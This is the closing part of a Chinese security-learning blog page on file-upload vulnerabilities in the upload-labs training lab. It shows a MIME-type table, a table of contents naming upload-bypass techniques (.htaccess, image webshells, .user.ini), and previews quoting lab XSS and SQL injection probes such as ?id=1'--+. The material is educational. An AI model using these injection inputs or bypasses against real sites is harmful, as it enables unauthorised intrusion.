+<tr>
+<td>message&#x2F;rfc822（RFC 822 形式）</td>
+</tr>
+<tr>
+<td>multipart&#x2F;alternative（HTML 邮件的 HTML 形式和纯文本形式，相同内容使 用不同形式表示）</td>
+</tr>
+<tr>
+<td>application&#x2F;x-www-form-urlencoded（POST 方法提交的表单）</td>
+</tr>
+<tr>
+<td>multipart&#x2F;form-data（POST 提交时伴随文件上传的表单）</td>
+</tr>
+</tbody></table>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/279171.html">文件上传漏洞详解 - FreeBuf网络安全行业门户</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://cyan5s.github.io">cyan5s</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://cyan5s.github.io/2025/09/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A01/">http://cyan5s.github.io/2025/09/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="post-share"><div class="social-share" data-image="/img/cyan5s.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/28/XSS%E5%AD%A6%E4%B9%A01/" title="XSS学习1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">XSS学习1</div></div><div class="info-2"><div class="info-item-1">xss-labs第一关无过滤 1&lt;script&gt;alert(1)&lt;/script&gt;  查看源码 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;script&gt;window.alert = function()//&#123;1&#125;&#123;     confirm(&quot;完成的不错！&quot;); window.location.href=&quot;level2.php?keyword=test&quot;; &#125;&lt;/script&gt;&lt;title&gt;欢迎来到level1&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&l...</div></div></div></a><a class="pagination-related" href="/2025/09/27/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A01/" title="SQL注入学习1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">SQL注入学习1</div></div><div class="info-2"><div class="info-item-1">用sqli-llabs第一关来理解 前置判断是否有注入点本质是判断是否将用户的输入拼接到代码里，即用户输入可影响页面状态。 123?id=1//页面返回正常?id=1&#x27;//如果报错，则说明有注入，且闭合方式为&#x27;  输入id=1，最终生成的SQL语句是： 1SELECT * FROM users WHERE id=&#x27;1&#x27; LIMIT 0,1  输入id=1&#39;，最终生成的SQL语句是： 12SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1            -- 闭合前引号 --^  ^-- 多出的一个引号  数据库执行该语句时报错，语法错误 输入?id=1&#39;--+，最终生成的SQL语句是： 1SELECT * FROM users WHERE id=&#x27;1&#x27;--+&#x27; LIMIT 0,1  将“’ LIMIT 0,1”注释，回显正常【“–+”“– ”“– ss”均可注释】 判断闭合方式 一、基础闭合方式1. 单引号闭合（’）1?i...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/cyan5s.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cyan5s</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" href="https://cyan5s.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#upload-labs"><span class="toc-number">1.</span> <span class="toc-text">upload-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">1.2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">1.3.</span> <span class="toc-text">第三关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%83%A8%E5%88%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%AF%E4%BB%A5%E5%B0%86-php3%EF%BC%8C-php5%EF%BC%8C-phtml%E2%80%A6%E2%80%A6%E8%A7%A3%E6%9E%90%E6%88%90php%E6%96%87%E4%BB%B6%E3%80%82"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.  部分服务器可以将.php3，.php5，.phtml……解析成php文件。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TS"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">TS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NTS"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">NTS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%83%85%E5%86%B5-1%EF%BC%9ANginx-PHP-FPM"><span class="toc-number">1.3.1.2.1.</span> <span class="toc-text">情况 1：Nginx + PHP-FPM</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%83%85%E5%86%B5-2%EF%BC%9AApache-PHP-FPM"><span class="toc-number">1.3.1.2.2.</span> <span class="toc-text">情况 2：Apache + PHP-FPM</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-php%E7%89%88%E6%9C%AC%E5%88%86%E4%B8%BAnts%EF%BC%88%E9%9D%9E%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%EF%BC%89%E5%92%8Cts%EF%BC%88%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. php版本分为nts（非线程安全）和ts（线程安全)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="toc-number">1.4.</span> <span class="toc-text">第四关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess"><span class="toc-number">1.4.1.</span> <span class="toc-text">.htaccess</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-AddType"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">使用 AddType</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-SetHandler"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">使用 SetHandler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-ForceType"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">使用 ForceType</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E7%89%B9%E5%AE%9A%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">针对特定文件名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%B9%E9%85%8D%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6%EF%BC%88%E6%85%8E%E7%94%A8%EF%BC%89"><span class="toc-number">1.4.1.5.</span> <span class="toc-text">匹配所有文件（慎用）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E5%90%88-mod-rewrite%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E8%A7%A3%E6%9E%90"><span class="toc-number">1.4.1.6.</span> <span class="toc-text">结合 mod_rewrite实现动态解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5%E4%B8%8A%E5%8F%AF%E5%90%88%E5%B9%B6"><span class="toc-number">1.4.1.7.</span> <span class="toc-text">以上可合并</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E5%86%99%E7%A0%81"><span class="toc-number">1.4.2.</span> <span class="toc-text">图片写码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%94%B9%E5%90%8E%E7%BC%80"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">直接改后缀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cmd"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">cmd</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="toc-number">1.5.</span> <span class="toc-text">第五关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess-httpd-conf-user-ini-php-ini"><span class="toc-number">1.5.1.</span> <span class="toc-text">.htaccess &amp; httpd.conf &amp; .user.ini &amp; php.ini</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini"><span class="toc-number">1.5.2.</span> <span class="toc-text">.user.ini</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9"><span class="toc-number">1.5.3.</span> <span class="toc-text">点空格点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E9%98%B2-%E7%BB%95%E8%BF%87%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">预防. .绕过的方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.6.</span> <span class="toc-text">补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%89%8D%E7%AB%AF%E6%A0%A1%E9%AA%8C%E8%BF%98%E6%98%AF%E5%90%8E%E7%AB%AF"><span class="toc-number">1.6.1.</span> <span class="toc-text">如何判断是前端校验还是后端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME%EF%BC%88Content-Type%EF%BC%89"><span class="toc-number">1.6.2.</span> <span class="toc-text">MIME（Content-Type）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/22/%E4%B8%8B%E6%96%AD%E7%82%B9%E7%9A%84%E6%96%B9%E6%B3%95/" title="下断点的方法">下断点的方法</a><time datetime="2025-11-22T03:52:26.000Z" title="Created 2025-11-22 11:52:26">2025-11-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/22/OD%E8%84%B1%E5%A3%B3/" title="OD脱壳">OD脱壳</a><time datetime="2025-11-22T03:45:01.000Z" title="Created 2025-11-22 11:45:01">2025-11-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/21/%E4%BD%9C%E5%93%81%E9%9B%86/" title="作品集">作品集</a><time datetime="2025-11-21T11:46:02.000Z" title="Created 2025-11-21 19:46:02">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/16/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/" title="信息泄露漏洞学习1">信息泄露漏洞学习1</a><time datetime="2025-10-16T12:30:21.000Z" title="Created 2025-10-16 20:30:21">2025-10-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/16/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="信息搜集">信息搜集</a><time datetime="2025-10-16T12:30:18.000Z" title="Created 2025-10-16 20:30:18">2025-10-16</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By cyan5s</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
